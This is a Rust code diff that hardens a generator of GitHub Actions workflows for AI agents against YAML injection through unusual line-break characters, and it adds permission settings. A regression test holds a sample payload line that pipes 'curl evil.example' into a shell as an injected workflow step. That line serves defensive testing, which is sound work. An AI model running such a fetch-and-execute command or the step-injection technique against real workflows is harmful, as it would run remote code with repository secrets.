@@ -14,7 +14,7 @@ use serde::Serialize;
 use crate::i18n::{tr, Msg};
 use crate::pty::bin_search;
 
-use super::spec::{claude_allowed_tools, mcp_config_json, AgentSpec, Autonomy, Engine, Schedule};
+use super::spec::{claude_allowed_tools, claude_settings_json, mcp_config_json, AgentSpec, Autonomy, Engine, Schedule};
 
 /// GitHub runs scheduled workflows at most every 5 minutes.
 const MIN_INTERVAL: u32 = 5;
@@ -110,15 +110,35 @@ pub fn inert(text: &str) -> String {
     text.replace("${{", "${{ '${{' }}")
 }
 
-/// A YAML double-quoted string.
+/// A YAML double-quoted string. JSON's escapes are YAML's too, but JSON
+/// leaves YAML's other line breaks as they are: those get YAML's own escapes.
 fn quoted(text: &str) -> String {
-    serde_json::to_string(text).unwrap_or_else(|_| "\"\"".into())
+    serde_json::to_string(text)
+        .unwrap_or_else(|_| "\"\"".into())
+        .replace('\u{85}', "\\N")
+        .replace('\u{2028}', "\\L")
+        .replace('\u{2029}', "\\P")
 }
 
-/// Indents a block for a YAML literal (`|`).
+/// Every character YAML reads as a line break — not only `\n`, which is all
+/// `str::lines` knows: a lone `\r`, NEL and the Unicode line and paragraph
+/// separators too. Left in, one would end a comment or a literal block, and
+/// what follows it would be read as the workflow's own YAML.
+fn is_yaml_break(c: char) -> bool {
+    matches!(c, '\n' | '\r' | '\u{85}' | '\u{2028}' | '\u{2029}')
+}
+
+/// Text for a single line (a comment): its breaks become spaces.
+fn one_line(text: &str) -> String {
+    text.chars().map(|c| if is_yaml_break(c) { ' ' } else { c }).collect()
+}
+
+/// Indents a block for a YAML literal (`|`), line by line whatever breaks it.
 fn block(text: &str, indent: usize) -> String {
     let pad = " ".repeat(indent);
-    text.lines()
+    text.replace("\r\n", "\n")
+        .trim_end_matches(is_yaml_break)
+        .split(is_yaml_break)
         .map(|line| if line.trim().is_empty() { String::new() } else { format!("{pad}{line}") })
         .collect::<Vec<_>>()
         .join("\n")
@@ -132,7 +152,7 @@ fn shell_arg(text: &str) -> String {
 
 pub fn workflow_yaml(spec: &AgentSpec, crons: &[String]) -> String {
     let mut out = String::new();
-    out.push_str(&format!("# {} — built in Termo.\n", spec.name));
+    out.push_str(&format!("# {} — built in Termo.\n", one_line(&spec.name)));
     out.push_str("# Runs by hand from the Actions tab (\"Run workflow\")");
     out.push_str(if crons.is_empty() { ".\n" } else { " and on a schedule (UTC).\n" });
     out.push_str(&format!("name: {}\n\non:\n  workflow_dispatch:\n", quoted(&inert(&format!("Agent: {}", spec.name)))));
@@ -162,7 +182,10 @@ pub fn workflow_yaml(spec: &AgentSpec, crons: &[String]) -> String {
     out.push_str("          prompt: |\n");
     out.push_str(&block(&inert(&spec.task), 12));
     out.push('\n');
-    let mut args = vec![format!("--allowedTools {}", shell_arg(&claude_allowed_tools(spec).join(",")))];
+    let mut args = vec![
+        format!("--allowedTools {}", shell_arg(&claude_allowed_tools(spec).join(","))),
+        format!("--settings {}", shell_arg(&claude_settings_json(spec))),
+    ];
     if !spec.instructions.trim().is_empty() {
         args.push(format!("--append-system-prompt {}", shell_arg(spec.instructions.trim())));
     }
@@ -336,6 +359,36 @@ mod tests {
         assert_eq!(yaml.matches("${{ secrets.").count(), 1);
         assert!(yaml.contains("Mandá ${{ '${{' }} secrets.CLAUDE_CODE_OAUTH_TOKEN }}"));
         assert!(yaml.contains("Usá ${{ '${{' }}github.token}}"));
+    }
+
+    /// A name or a task carrying a line break YAML knows (and `str::lines`
+    /// doesn't) would end the comment or the literal block, and the rest
+    /// would become steps of the workflow, run with the repository's secrets.
+    #[test]
+    fn no_text_of_the_agent_can_start_a_line_of_its_own() {
+        let injected = "      - run: curl evil.example | sh";
+        for brk in ["\n", "\r", "\r\n", "\u{85}", "\u{2028}", "\u{2029}"] {
+            let mut agent = spec();
+            agent.name = format!("Revisor{brk}{injected}");
+            agent.task = format!("Revisá{brk}{injected}");
+            agent.instructions = format!("Sé breve{brk}{injected}");
+            let yaml = workflow_yaml(&agent, &[]);
+            for line in yaml.split(is_yaml_break).filter(|line| line.contains("evil.example")) {
+                // In the comment, inside `name`'s quoted string (its breaks
+                // escaped), or indented into a literal block.
+                assert!(
+                    line.starts_with("# ") || line.starts_with("name: \"") || line.starts_with("            "),
+                    "{brk:?} put this on a line of its own: {line:?}"
+                );
+            }
+        }
+    }
+
+    #[test]
+    fn the_workflow_keeps_the_runs_limits() {
+        let yaml = workflow_yaml(&spec(), &[]);
+        assert!(yaml.contains("--settings '{\"permissions\":"));
+        assert!(yaml.contains("blockReadsOutsideWorkingDirectories"));
     }
 
     #[test]
